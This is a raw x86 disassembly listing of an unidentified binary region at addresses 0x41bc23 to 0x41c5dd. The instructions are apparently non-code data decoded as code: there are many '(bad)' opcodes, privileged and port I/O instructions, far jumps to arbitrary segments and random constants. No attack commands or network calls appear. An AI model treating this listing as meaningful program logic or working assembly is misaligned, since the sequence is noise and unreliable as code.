  41bc23:	ja     0x41bc1f
  41bc25:	pop    edi
  41bc26:	inc    eax
  41bc27:	adc    ch,BYTE PTR [ebp*8-0xe9926bc]
  41bc2e:	dec    ecx
  41bc2f:	xlat   BYTE PTR ds:[ebx]
  41bc30:	in     eax,0x51
  41bc32:	mov    dl,0xd0
  41bc34:	jp     0x41bc5f
  41bc36:	mov    al,0xbe
  41bc38:	je     0x41bbc2
  41bc3a:	test   eax,0x4347415a
  41bc3f:	xchg   DWORD PTR [ecx+0x198bac93],esi
  41bc45:	and    BYTE PTR [edi+0x15],cl
  41bc48:	mov    dh,0x8d
  41bc4a:	call   DWORD PTR [edx-0x502cf557]
  41bc50:	and    BYTE PTR [edx-0x73],ah
  41bc53:	jl     0x41bcb5
  41bc55:	mov    ch,0x3c
  41bc57:	dec    ebp
  41bc58:	icebp  
  41bc59:	aaa    
  41bc5a:	dec    ebp
  41bc5b:	(bad)  
  41bc5c:	gs dec bl
  41bc5f:	jno    0x41bc9f
  41bc61:	pop    ss
  41bc62:	fnsave [ebx+0x60]
  41bc65:	jmp    0x41bcb0
  41bc67:	sbb    ebx,DWORD PTR [edx]
  41bc69:	jp     0x41bc9a
  41bc6b:	push   0xd3b5b494
  41bc70:	and    bh,BYTE PTR [edi+0x50]
  41bc73:	xchg   esp,eax
  41bc74:	jbe    0x41bbfa
  41bc76:	jo     0x41bc97
  41bc78:	imul   sp,WORD PTR [edi],0xb19d
  41bc7d:	and    BYTE PTR [edi+ebp*4-0x15],bl
  41bc81:	xor    ebp,ebx
  41bc83:	sar    DWORD PTR [ebx+0x7c],1
  41bc86:	mov    edx,DWORD PTR [esi]
  41bc88:	dec    ecx
  41bc89:	cs pop es
  41bc8b:	rol    DWORD PTR [esi-0x14f4ffa5],1
  41bc91:	jle    0x41bcd3
  41bc93:	inc    edi
  41bc94:	dec    ecx
  41bc95:	pop    edx
  41bc96:	mov    ch,0x49
  41bc98:	pop    es
  41bc99:	int3   
  41bc9a:	push   ebx
  41bc9b:	outs   dx,DWORD PTR ds:[esi]
  41bc9c:	jno    0x41bca9
  41bc9e:	(bad)  
  41bc9f:	loop   0x41bcb5
  41bca1:	sub    BYTE PTR [edx-0x12f73ca4],al
  41bca7:	stos   DWORD PTR es:[edi],eax
  41bca8:	std    
  41bca9:	(bad)  
  41bcaa:	push   cs
  41bcab:	std    
  41bcac:	jnp    0x41bccc
  41bcae:	(bad)  
  41bcb0:	adc    ebp,DWORD PTR [ebx-0x54c9f3b9]
  41bcb6:	enter  0xa167,0xa3
  41bcba:	mov    bl,0xd5
  41bcbc:	pop    ss
  41bcbd:	je     0x41bcf9
  41bcbf:	jbe    0x41bc63
  41bcc1:	sbb    al,0xf6
  41bcc3:	xor    eax,0xc64a0539
  41bcc8:	dec    ebp
  41bcc9:	aad    0x2
  41bccb:	idiv   BYTE PTR [ebx-0x540a98f8]
  41bcd1:	mov    ebp,DWORD PTR [esi-0x3c4c46f8]
  41bcd7:	js     0x41bce2
  41bcd9:	push   0x3
  41bcdb:	ins    DWORD PTR es:[edi],dx
  41bcdc:	mov    dh,0xf8
  41bcde:	xchg   ecx,eax
  41bcdf:	in     al,dx
  41bce0:	mov    esp,0xc81cd038
  41bce5:	sub    eax,0x3d2af535
  41bcea:	(bad)  
  41bcec:	push   ds
  41bced:	aad    0x0
	...
  41bd53:	add    BYTE PTR [eax],al
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x2a8d9d8
  41bd64:	inc    ebp
  41bd65:	mov    cl,0x67
  41bd67:	sub    eax,DWORD PTR [ecx]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [esi+0x19],bl
  41bd70:	(bad)
  41bd74:	loopne 0x41bdb6
  41bd76:	cmp    ah,bl
  41bd78:	(bad)  [ecx-0x7d]
  41bd7b:	js     0x41bdaa
  41bd7d:	cwde   
  41bd7e:	mov    eax,ds:0xde9593f3
  41bd83:	push   ecx
  41bd84:	xor    BYTE PTR [edi-0x26690b43],bl
  41bd8a:	push   0xa2896b5c
  41bd8f:	out    dx,eax
  41bd90:	jecxz  0x41bdd5
  41bd92:	adc    BYTE PTR gs:[ebx],0x24
  41bd96:	gs rol cl,1
  41bd99:	sbb    dh,ah
  41bd9b:	or     DWORD PTR [ecx+0x32],edx
  41bd9e:	jae    0x41bd2d
  41bda0:	test   eax,0x35f76dd3
  41bda5:	sbb    DWORD PTR [ebx],ecx
  41bda7:	xor    eax,0x1322b26
  41bdac:	xchg   bh,cl
  41bdae:	inc    edi
  41bdaf:	xlat   BYTE PTR ds:[ebx]
  41bdb0:	xchg   esp,eax
  41bdb1:	jl     0x41be2c
  41bdb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdb4:	add    eax,0xc626719a
  41bdb9:	mul    eax
  41bdbb:	push   esi
  41bdbc:	ja     0x41be32
  41bdbe:	retf   0xccda
  41bdc1:	test   DWORD PTR [ebp+0x2dcf7cb6],0x56c3616d
  41bdcb:	mov    ch,0x40
  41bdcd:	retf   
  41bdce:	les    ebx,FWORD PTR [edx]
  41bdd0:	cmp    bl,ch
  41bdd2:	push   esp
  41bdd3:	push   ds
  41bdd4:	daa    
  41bdd5:	add    BYTE PTR [esi-0x5d0fb2e],bh
  41bddb:	sbb    BYTE PTR [ebp+0xb42fe9c],dh
  41bde1:	sar    BYTE PTR [ebx+0x7c7ceeef],1
  41bde7:	or     BYTE PTR [edx+esi*4+0x1f],ch
  41bdeb:	icebp  
  41bdec:	retf   0x5e38
  41bdef:	jmp    0x2d77:0xb404bed0
  41bdf6:	imul   eax,DWORD PTR [edi+0x7d5c85fc],0xbf1e494d
  41be00:	mov    bl,0x52
  41be02:	xchg   ebx,eax
  41be03:	sti    
  41be04:	pusha  
  41be05:	mov    ds:0xf72c52e0,eax
  41be0a:	js     0x41bdf2
  41be0c:	shr    esp,0xc2
  41be0f:	sbb    dl,BYTE PTR [eax]
  41be11:	sbb    eax,0x312ba610
  41be16:	mov    edx,0x6bdab610
  41be1b:	mov    BYTE PTR [edx],cl
  41be1d:	mov    dl,0xbf
  41be1f:	push   0xffffffe0
  41be21:	je     0x41be40
  41be23:	mov    al,ds:0x2bf823b0
  41be28:	xchg   ecx,eax
  41be29:	sbb    cl,BYTE PTR [edi]
  41be2b:	stos   DWORD PTR es:[edi],eax
  41be2c:	es js  0x41bdfd
  41be2f:	inc    edx
  41be30:	jmp    0x3a53:0x9022fd0b
  41be37:	mov    ds:0x5ea7e403,al
  41be3c:	or     BYTE PTR [edx],dl
  41be3e:	sub    eax,0x8b2bc154
  41be44:	jp     0x41be95
  41be46:	pop    ecx
  41be47:	cmc    
  41be48:	(bad)  
  41be49:	xlat   BYTE PTR ds:[ebx]
  41be4a:	test   edi,eax
  41be4c:	xchg   edi,eax
  41be4d:	sbb    al,0x96
  41be4f:	jg     0x41be51
  41be51:	in     al,0x51
  41be53:	fdivr  QWORD PTR [esi+edx*1-0x2e]
  41be57:	push   ebx
  41be58:	mov    bh,BYTE PTR [ebx+0x62]
  41be5b:	ds ins DWORD PTR es:[edi],dx
  41be5d:	jl     0x41bddf
  41be5f:	xlat   BYTE PTR ds:[ebx]
  41be60:	jae    0x41bdeb
  41be62:	mov    ecx,0x4e53690
  41be67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be68:	cli    
  41be69:	and    ecx,DWORD PTR [edi]
  41be6b:	inc    eax
  41be6c:	jecxz  0x41be3a
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx-0x2b88c09a]
  41bee4:	das    
  41bee5:	sub    eax,0x12c67
  41beea:	add    BYTE PTR [ecx],al
  41beec:	add    BYTE PTR [eax],al
  41beee:	mov    ds:0xf2093860,eax
  41bef3:	xchg   DWORD PTR [esi],ebx
  41bef5:	cli    
  41bef6:	pusha  
  41bef7:	jge    0x41bf06
  41bef9:	mov    esp,0x7655bd6f
  41befe:	push   ebp
  41beff:	adc    DWORD PTR ds:[edx-0x4ab433f2],ebp
  41bf06:	call   DWORD PTR [edi]
  41bf08:	lock add dl,BYTE PTR [edx-0x6052121e]
  41bf0f:	loop   0x41bf49
  41bf11:	outs   dx,DWORD PTR ds:[esi]
  41bf12:	mov    eax,0xb34bc135
  41bf17:	xchg   edi,eax
  41bf18:	xlat   BYTE PTR ds:[ebx]
  41bf19:	iret   
  41bf1a:	inc    DWORD PTR [ebx+0x2a50824c]
  41bf20:	add    dl,0x2b
  41bf23:	ss push ds
  41bf25:	mov    al,0x52
  41bf27:	fs loopne 0x41bf3d
  41bf2a:	jl     0x41beb6
  41bf2c:	mov    eax,ds:0x20d1a07e
  41bf31:	inc    ebp
  41bf32:	pop    ebp
  41bf33:	sbb    cl,BYTE PTR [edx-0x77]
  41bf36:	pop    ebp
  41bf37:	ds xchg edi,eax
  41bf39:	or     eax,0x8829a13d
  41bf3e:	ins    BYTE PTR es:[edi],dx
  41bf3f:	clc    
  41bf40:	jg     0x41bec9
  41bf42:	push   edi
  41bf43:	pop    es
  41bf44:	jmp    0x4d:0x4b64e0ec
  41bf4b:	push   ss
  41bf4c:	or     edi,0xbdbb9c6e
  41bf52:	or     al,0x57
  41bf54:	lds    ebp,FWORD PTR [esi]
  41bf56:	cmp    eax,0xbae7f18a
  41bf5b:	es scas al,BYTE PTR es:[edi]
  41bf5d:	inc    ebx
  41bf5e:	sahf   
  41bf5f:	jns    0x41bfcc
  41bf61:	fwait
  41bf62:	inc    ebx
  41bf63:	and    al,0x3c
  41bf65:	outs   dx,DWORD PTR ds:[esi]
  41bf66:	add    al,0xa3
  41bf68:	imul   edi,DWORD PTR [ebx-0x41],0x89179e5c
  41bf6f:	xchg   edx,eax
  41bf70:	cdq    
  41bf71:	bound  edi,QWORD PTR [ebp+0x7e]
  41bf74:	inc    eax
  41bf75:	push   edx
  41bf76:	adc    DWORD PTR [ecx+0x2f3087bc],edi
  41bf7c:	cmc    
  41bf7d:	add    BYTE PTR [edi],al
  41bf7f:	sbb    BYTE PTR [ebp-0x8],ah
  41bf82:	test   DWORD PTR [esi+0x19],ebx
  41bf85:	and    ch,dh
  41bf87:	xchg   ebx,eax
  41bf88:	bnd je 0x41bf77
  41bf8b:	(bad)  
  41bf8c:	(bad)  
  41bf8d:	bound  eax,QWORD PTR [eax-0x41]
  41bf90:	rol    BYTE PTR [edi+0x52],0x68
  41bf94:	fadd   DWORD PTR [ebx]
  41bf96:	hlt    
  41bf97:	sbb    ecx,DWORD PTR [ebx-0x4072212c]
  41bf9d:	cmp    ebx,esp
  41bf9f:	xor    al,0x3d
  41bfa1:	gs popa 
  41bfa3:	dec    ebp
  41bfa4:	test   al,0x67
  41bfa6:	inc    BYTE PTR [ebx+0x2a6bd6d5]
  41bfac:	xchg   ebp,eax
  41bfad:	pop    edi
  41bfae:	add    BYTE PTR [edi*2-0x4dc65792],0xab
  41bfb6:	bound  eax,QWORD PTR [ecx-0x3c]
  41bfb9:	push   ecx
  41bfba:	ins    DWORD PTR es:[edi],dx
  41bfbb:	lods   al,BYTE PTR ds:[esi]
  41bfbc:	imul   ecx,DWORD PTR [ebx],0xffffffed
  41bfbf:	std    
  41bfc0:	lds    edi,FWORD PTR [eax+0x59]
  41bfc3:	pop    ebp
  41bfc4:	leave  
  41bfc5:	rcr    DWORD PTR [ecx+eiz*2+0x1d6266de],1
  41bfcc:	mov    WORD PTR ds:0x3deb82d9,gs
  41bfd2:	shl    BYTE PTR [edx-0x18f47958],1
  41bfd8:	in     eax,dx
  41bfd9:	add    DWORD PTR [ecx-0x4527bbab],eax
  41bfdf:	test   edi,ecx
  41bfe1:	cmp    al,0xf2
  41bfe3:	mov    ebp,0xc5748e1e
  41bfe8:	add    dh,BYTE PTR [ebx-0x36]
  41bfeb:	js     0x41bfdd
  41bfed:	inc    edi
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	out    dx,al
  41c063:	mov    ah,BYTE PTR [ecx-0x30]
  41c066:	addr16 sub eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	enter  0xff0a,0x47
  41c072:	popf   
  41c073:	mov    al,ds:0xf4656e14
  41c078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c079:	(bad)  
  41c07b:	fcom   QWORD PTR [esi]
  41c07d:	(bad)  
  41c07e:	stc    
  41c07f:	es xchg ebx,eax
  41c081:	push   ecx
  41c082:	add    cl,BYTE PTR [esp+eax*2-0xf3584ac]
  41c089:	ins    BYTE PTR es:[edi],dx
  41c08a:	arpl   WORD PTR [ebx],dx
  41c08c:	mov    WORD PTR [eax],fs
  41c08e:	mov    ds:0x8cee0c5f,al
  41c093:	jl     0x41c0bf
  41c095:	xchg   ebp,eax
  41c096:	mov    esp,0xe20dc68f
  41c09b:	js     0x41c090
  41c09d:	(bad)  
  41c09e:	aas    
  41c09f:	test   ah,dh
  41c0a1:	cmc    
  41c0a2:	xchg   BYTE PTR [edx+ecx*8-0x3f22887],dh
  41c0a9:	arpl   WORD PTR [eax],cx
  41c0ab:	push   cs
  41c0ac:	mov    esp,0x3738ee66
  41c0b1:	cmp    eax,0x90d30a66
  41c0b6:	leave  
  41c0b7:	pop    ebx
  41c0b8:	cmp    BYTE PTR [eax],cl
  41c0ba:	xor    edx,DWORD PTR [esi+0x6ae9361]
  41c0c0:	and    al,0xf8
  41c0c2:	imul   edx,DWORD PTR [ebp-0x28],0x4ff35356
  41c0c9:	in     eax,dx
  41c0ca:	mov    WORD PTR gs:[ebx],cs
  41c0cd:	int    0x90
  41c0cf:	sbb    BYTE PTR [esi],0x3e
  41c0d2:	stos   BYTE PTR es:[edi],al
  41c0d3:	retf   
  41c0d4:	push   0x33
  41c0d6:	outs   dx,DWORD PTR ds:[esi]
  41c0d7:	(bad)  
  41c0d8:	loop   0x41c110
  41c0da:	hlt    
  41c0db:	jg     0x41c092
  41c0dd:	mov    bl,0x5
  41c0df:	(bad)
  41c0e3:	(bad)  
  41c0e4:	cmp    DWORD PTR [esi+eax*2-0x4a],esi
  41c0e8:	aam    0x16
  41c0ea:	repz jle 0x41c123
  41c0ed:	and    BYTE PTR ss:[edx],bh
  41c0f0:	and    esp,edi
  41c0f2:	int    0x96
  41c0f4:	sbb    cl,BYTE PTR [edx]
  41c0f6:	push   esi
  41c0f7:	add    al,0xd0
  41c0f9:	(bad)  
  41c0fa:	std    
  41c0fb:	hlt    
  41c0fc:	mov    edi,0x69c91a8a
  41c101:	ss pop ecx
  41c103:	add    esp,DWORD PTR [eax+0xdd74d57]
  41c109:	cld    
  41c10a:	mov    esi,0xc5df2a97
  41c10f:	dec    edi
  41c110:	dec    eax
  41c111:	call   0x9fce:0xd695934e
  41c118:	aad    0x66
  41c11a:	std    
  41c11b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c11c:	out    0x6a,al
  41c11e:	pop    ebx
  41c11f:	adc    eax,DWORD PTR ds:0x7053a88
  41c125:	std    
  41c126:	data16 adc al,0x6
  41c129:	mov    cl,0xc7
  41c12b:	aam    0xc9
  41c12d:	(bad)  
  41c12e:	or     al,0x54
  41c130:	repz inc edi
  41c132:	mov    cl,0x44
  41c134:	pop    esi
  41c135:	mov    ds:0x2b9924be,al
  41c13a:	mov    esp,0x9cf93fdb
  41c13f:	add    eax,0x507a72e9
  41c144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c145:	adc    eax,0x55debbe6
  41c14a:	in     eax,0x92
  41c14c:	and    eax,0xfedc35e3
  41c151:	mov    ss,WORD PTR [ecx-0x794e4770]
  41c157:	and    eax,0x509d03a1
  41c15c:	push   edi
  41c15d:	mov    ch,0x9f
  41c15f:	xor    eax,0xe3b72796
  41c164:	sti    
  41c165:	mov    esi,DWORD PTR [ecx-0x73d8695d]
  41c16b:	fld    QWORD PTR [esi]
  41c16d:	fild   WORD PTR [eax]
	...
  41c1d3:	add    BYTE PTR [eax],al
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0x3de90501,0xffffffd6
  41c1e4:	pop    es
  41c1e5:	loop   0x41c24e
  41c1e7:	add    DWORD PTR cs:[eax],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	arpl   WORD PTR ds:0xf0635f0e,cx
  41c1f4:	and    ch,al
  41c1f6:	in     eax,0x60
  41c1f8:	mov    edx,DWORD PTR [ecx-0x7f1deba9]
  41c1fe:	fidivr WORD PTR [edx-0x6f]
  41c201:	push   ebx
  41c202:	pusha  
  41c203:	adc    BYTE PTR [esi-0x354fae3f],0x89
  41c20a:	jne    0x41c1dc
  41c20c:	push   cs
  41c20d:	push   ecx
  41c20e:	adc    al,0xa0
  41c210:	jp     0x41c201
  41c212:	fist   DWORD PTR [ebp-0x39]
  41c215:	xor    DWORD PTR [ebp-0x5bd7ba1c],0x34
  41c21c:	sbb    dh,ch
  41c21e:	imul   edi,DWORD PTR [ebx+ecx*8-0x3c41884d],0x17
  41c226:	jne    0x41c1db
  41c228:	mov    eax,ds:0xb1396a16
  41c22d:	jne    0x41c1d1
  41c22f:	repnz clc 
  41c231:	cmp    eax,eax
  41c233:	xchg   ecx,eax
  41c234:	mov    ch,0xcf
  41c236:	and    dh,BYTE PTR [edx]
  41c238:	pop    ds
  41c239:	jle    0x41c1f6
  41c23b:	sbb    al,0xb2
  41c23d:	fisub  WORD PTR [edi-0x60313c59]
  41c243:	in     eax,0x5f
  41c245:	sbb    cl,BYTE PTR [ecx]
  41c247:	loop   0x41c29f
  41c249:	imul   DWORD PTR [ebx+eax*2]
  41c24c:	loop   0x41c1fa
  41c24e:	cli    
  41c24f:	inc    edi
  41c250:	dec    edi
  41c251:	sub    al,0x52
  41c253:	add    dh,BYTE PTR [edi+ecx*2]
  41c256:	or     esp,DWORD PTR [ecx-0x30b411e8]
  41c25c:	dec    edi
  41c25d:	test   BYTE PTR [edx+0x51b24864],cl
  41c263:	mov    edx,0xc64cf7b1
  41c268:	xor    al,0xb2
  41c26a:	jecxz  0x41c2b1
  41c26c:	in     eax,dx
  41c26d:	sub    dl,BYTE PTR [esi+ebx*2+0x1acf2e01]
  41c274:	and    BYTE PTR [eax-0x3486c7a2],dl
  41c27a:	scas   al,BYTE PTR es:[edi]
  41c27b:	pusha  
  41c27c:	push   ebx
  41c27d:	cmc    
  41c27e:	ja     0x41c2d4
  41c280:	inc    esi
  41c281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c282:	out    0xc9,eax
  41c284:	scas   al,BYTE PTR es:[edi]
  41c285:	jmp    0x1f39b93
  41c28a:	sub    dh,ch
  41c28c:	lahf   
  41c28d:	outs   dx,BYTE PTR ds:[esi]
  41c28e:	or     ah,al
  41c290:	jge    0x41c310
  41c292:	aad    0x87
  41c294:	xor    eax,0xe2bb1333
  41c299:	sbb    edx,esi
  41c29b:	sar    DWORD PTR [ebp+0x41b0a2d0],cl
  41c2a1:	cs mov ch,0xa6
  41c2a4:	std    
  41c2a5:	fbld   TBYTE PTR [edi+0x500a471b]
  41c2ab:	push   eax
  41c2ac:	push   ecx
  41c2ad:	cmp    DWORD PTR [eax-0x2ad9ae69],edi
  41c2b3:	dec    edi
  41c2b4:	iret   
  41c2b5:	adc    ch,bl
  41c2b7:	xor    al,0x96
  41c2b9:	sub    BYTE PTR [edi],dl
  41c2bb:	jle    0x41c32f
  41c2bd:	(bad)  
  41c2be:	xor    al,0xcd
  41c2c0:	mov    bh,0x98
  41c2c2:	dec    esi
  41c2c3:	jp     0x41c2f7
  41c2c5:	push   cs
  41c2c6:	jne    0x41c32a
  41c2c8:	lods   eax,DWORD PTR ds:[esi]
  41c2c9:	jle    0x41c304
  41c2cb:	or     BYTE PTR [edx],dh
  41c2cd:	mov    WORD PTR [edx+ebx*1],ds
  41c2d0:	(bad)  
  41c2d1:	sar    DWORD PTR [ebx-0x3b1d8032],1
  41c2d7:	mov    dl,0x35
  41c2d9:	cmp    BYTE PTR [ebx+0x13],0x7e
  41c2dd:	mov    bh,BYTE PTR [eax*8+0x273bfa03]
  41c2e4:	xchg   esp,eax
  41c2e5:	out    dx,eax
  41c2e6:	ret    0x8cd9
  41c2e9:	lods   eax,DWORD PTR ds:[esi]
  41c2ea:	add    al,0x11
  41c2ec:	mov    dl,0x3d
	...
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	cli    
  41c363:	out    dx,al
  41c364:	pop    ss
  41c365:	stc    
  41c366:	addr16 das 
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	out    0xb9,eax
  41c370:	imul   esp,DWORD PTR [edi+edx*4],0x2d
  41c374:	call   0x5159:0xcc7031a2
  41c37b:	retf   0xe0cf
  41c37e:	jne    0x41c3fd
  41c380:	mov    BYTE PTR [edx+0x49],cl
  41c383:	xchg   edi,eax
  41c384:	adc    eax,0xdd75d46a
  41c389:	dec    edx
  41c38a:	(bad)
  41c38e:	fs dec ecx
  41c390:	cmp    cl,BYTE PTR [edx]
  41c392:	xchg   ebp,eax
  41c393:	xchg   esp,eax
  41c394:	stos   DWORD PTR es:[edi],eax
  41c395:	mov    bh,0xa7
  41c397:	dec    edx
  41c398:	ja     0x41c33c
  41c39a:	test   eax,0xf2f04ef2
  41c39f:	jmp    0x41c39b
  41c3a1:	pop    eax
  41c3a2:	mov    al,0x15
  41c3a4:	jns    0x41c3ba
  41c3a6:	test   DWORD PTR [esp+eax*1+0x22],edi
  41c3aa:	sub    bh,BYTE PTR [esi]
  41c3ac:	mov    dh,bh
  41c3ae:	stos   DWORD PTR es:[edi],eax
  41c3af:	rcr    BYTE PTR [edx],0xda
  41c3b2:	addr16 ss or edx,eax
  41c3b6:	or     ch,BYTE PTR [edi+0x3f381341]
  41c3bc:	cmp    al,0xf7
  41c3be:	xor    al,0x93
  41c3c0:	cmovle ebx,DWORD PTR [esi]
  41c3c3:	out    dx,al
  41c3c4:	and    dh,dl
  41c3c6:	mov    BYTE PTR [ecx],al
  41c3c8:	test   eax,0xea0ca5ea
  41c3cd:	rcr    BYTE PTR [ebx+0x76],0xc3
  41c3d1:	jae    0x41c418
  41c3d3:	sbb    al,0xcc
  41c3d5:	loopne 0x41c365
  41c3d7:	inc    ebp
  41c3d8:	xor    bl,BYTE PTR [ebp+0x2d03b2e6]
  41c3de:	leave  
  41c3df:	popf   
  41c3e0:	in     al,0x5d
  41c3e2:	ss add eax,0x5d153edc
  41c3e8:	je     0x41c417
  41c3ea:	dec    esp
  41c3eb:	test   eax,0x98251ee0
  41c3f0:	dec    edi
  41c3f1:	mov    cl,0x78
  41c3f3:	mov    ecx,0x3a0e5864
  41c3f8:	fs pushf 
  41c3fa:	xchg   edi,eax
  41c3fb:	mov    ecx,0x81665198
  41c400:	xor    edi,DWORD PTR [ebx-0x53054377]
  41c406:	xchg   dh,ch
  41c408:	icebp  
  41c409:	mov    ch,0xee
  41c40b:	pop    DWORD PTR [esi+0x2444e320]
  41c411:	les    edx,FWORD PTR [ecx]
  41c413:	popa   
  41c414:	mov    ds:0x232aafb,eax
  41c419:	loopne 0x41c465
  41c41b:	(bad)  
  41c41c:	outs   dx,BYTE PTR ds:[esi]
  41c41d:	jo     0x41c422
  41c41f:	add    eax,0xe45bd40
  41c424:	leave  
  41c425:	mov    ds:0xbee77eb0,eax
  41c42a:	pop    ss
  41c42b:	lock fistp QWORD PTR [eax+ebp*8]
  41c42f:	mov    ds:0xea5b1888,al
  41c434:	iret   
  41c435:	push   eax
  41c436:	mov    bl,0x1b
  41c438:	inc    ecx
  41c439:	xchg   edx,eax
  41c43a:	fistp  QWORD PTR [esp+esi*8+0x5fcae19]
  41c441:	sub    eax,0xa4c65c
  41c446:	ja     0x41c46d
  41c448:	retf   
  41c449:	jle    0x41c3d9
  41c44b:	adc    al,0x46
  41c44d:	lds    edi,FWORD PTR [esi+0x18]
  41c450:	mov    bh,0x4d
  41c452:	adc    ch,bh
  41c454:	inc    ebx
  41c455:	push   0xffffff8e
  41c457:	test   al,0xd5
  41c459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c45a:	gs jmp 0x8809:0x400dac6e
  41c462:	cmp    al,0x55
  41c464:	jo     0x41c47b
  41c466:	nop
  41c467:	bound  edi,QWORD PTR [ebx]
  41c469:	fs inc ebx
  41c46b:	dec    ebp
  41c46c:	pop    esp
  41c46d:	je     0x41c46f
	...
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	inc    edx
  41c4e3:	inc    esi
  41c4e4:	(bad)  
  41c4e5:	adc    esp,DWORD PTR [edi+0x30]
  41c4e8:	add    DWORD PTR [eax],eax
  41c4ea:	add    BYTE PTR [ecx],al
  41c4ec:	add    BYTE PTR [eax],al
  41c4ee:	add    ebx,esp
  41c4f0:	stos   DWORD PTR es:[edi],eax
  41c4f1:	push   edx
  41c4f2:	dec    eax
  41c4f3:	xor    edx,DWORD PTR [edx+ecx*1+0x5689139d]
  41c4fa:	push   esp
  41c4fb:	daa    
  41c4fc:	mov    ebp,0x330ec5e
  41c501:	repz push ebx
  41c503:	pop    esp
  41c504:	pushf  
  41c505:	jno    0x41c554
  41c507:	ins    DWORD PTR es:[edi],dx
  41c508:	adc    eax,0xd15c4d83
  41c50d:	and    esp,eax
  41c50f:	mov    ds:0x5812ecec,eax
  41c514:	dec    esp
  41c515:	push   es
  41c516:	ins    BYTE PTR es:[edi],dx
  41c517:	stc    
  41c518:	xchg   edx,eax
  41c519:	xchg   esp,eax
  41c51a:	mov    ds:0x81d9b55,eax
  41c51f:	lea    edi,[eax-0x137df9bc]
  41c525:	mov    cs,WORD PTR [esi+0x276f259d]
  41c52b:	stos   BYTE PTR es:[edi],al
  41c52c:	int3   
  41c52d:	retf   0xb249
  41c530:	mov    ecx,0x91262a32
  41c535:	sahf   
  41c536:	and    BYTE PTR [ebp-0x78],0xeb
  41c53a:	dec    ecx
  41c53b:	pop    edi
  41c53c:	popf   
  41c53d:	out    0x73,al
  41c53f:	(bad)  
  41c540:	cmp    al,0x11
  41c542:	(bad)  
  41c544:	mov    eax,ds:0x4b40c6d2
  41c549:	dec    esp
  41c54a:	cmp    esp,DWORD PTR [ebx]
  41c54c:	pusha  
  41c54d:	aam    0x89
  41c54f:	mov    dl,0xa6
  41c551:	mov    ch,0xb5
  41c553:	loop   0x41c5d0
  41c555:	or     ch,BYTE PTR [eax+0x6]
  41c558:	push   esi
  41c559:	aaa    
  41c55a:	stc    
  41c55b:	sar    BYTE PTR [edx+ebx*8-0x2219a518],cl
  41c562:	aad    0x57
  41c564:	xchg   edx,eax
  41c565:	jbe    0x41c5bf
  41c567:	popa   
  41c568:	mov    edi,0xf96fa1ea
  41c56d:	(bad)  
  41c56e:	pop    edi
  41c56f:	ins    DWORD PTR es:[edi],dx
  41c570:	mov    bh,ah
  41c572:	jne    0x41c57f
  41c574:	cli    
  41c575:	cmp    esp,DWORD PTR [eax+0x25]
  41c578:	pop    ebp
  41c579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c57a:	mov    BYTE PTR [ecx-0x85f7013],al
  41c580:	shl    ebx,1
  41c582:	scas   eax,DWORD PTR es:[edi]
  41c583:	cdq    
  41c584:	retf   0xf424
  41c587:	pop    edx
  41c588:	mul    DWORD PTR [edx-0x31]
  41c58b:	cli    
  41c58c:	xchg   DWORD PTR [edx],ebp
  41c58e:	push   es
  41c58f:	dec    ecx
  41c590:	xor    al,0x81
  41c592:	sub    eax,0xd5c75213
  41c597:	out    0x3,al
  41c599:	dec    edi
  41c59a:	jmp    0x2f63b5de
  41c59f:	faddp  st(5),st
  41c5a1:	mov    dh,0x29
  41c5a3:	in     al,dx
  41c5a4:	stos   BYTE PTR es:[edi],al
  41c5a5:	cld    
  41c5a6:	xchg   ebp,eax
  41c5a7:	nop
  41c5a8:	jo     0x41c5aa
  41c5aa:	add    eax,0xe7733319
  41c5af:	pop    ds
  41c5b0:	icebp  
  41c5b1:	inc    edx
  41c5b2:	dec    edi
  41c5b3:	je     0x41c5d3
  41c5b5:	mov    esp,0x50ceed08
  41c5ba:	mov    DWORD PTR [eax-0x20b998fa],ecx
  41c5c0:	push   edx
  41c5c1:	lods   eax,DWORD PTR ds:[esi]
  41c5c2:	mov    edx,0x4c71b55c
  41c5c7:	and    ch,dh
  41c5c9:	and    al,0xba
  41c5cb:	rcl    BYTE PTR [ebx+0x6e],1
  41c5ce:	inc    esi
  41c5cf:	inc    ecx
  41c5d0:	pop    edx
  41c5d1:	into   
  41c5d2:	adc    al,0x33
  41c5d4:	daa    
  41c5d5:	les    ebp,FWORD PTR [edi+0x6e1383be]
  41c5db:	jg     0x41c561
  41c5dd:	mov    al,ds:0x6130c9f5
